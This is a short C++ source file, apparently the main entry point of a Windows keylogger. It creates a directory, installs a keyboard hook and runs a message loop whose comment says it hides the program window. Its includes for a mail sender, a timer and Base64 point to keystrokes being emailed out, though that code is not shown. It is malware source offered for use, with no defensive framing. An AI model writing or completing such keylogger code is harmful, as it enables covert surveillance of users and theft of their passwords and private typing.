#include <iostream>
#include <windows.h>

#include "../headers/KeyConstants.h"
#include "../headers/Helper.h"
#include "../headers/Base64.h"
#include "../headers/IO.h"
#include "../headers/Timer.h"
#include "../headers/SendMail.h"
#include "../headers/KeybHook.h"

using namespace std;

int main()
{
	MSG Msg;
	IO::MkDir(IO::GetOurPath(true));
	InstallHook();
	while (GetMessage(&Msg, NULL, 0 , 0))	/* hide the exec window */
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
	MailTimer.stop();
	return 0;
}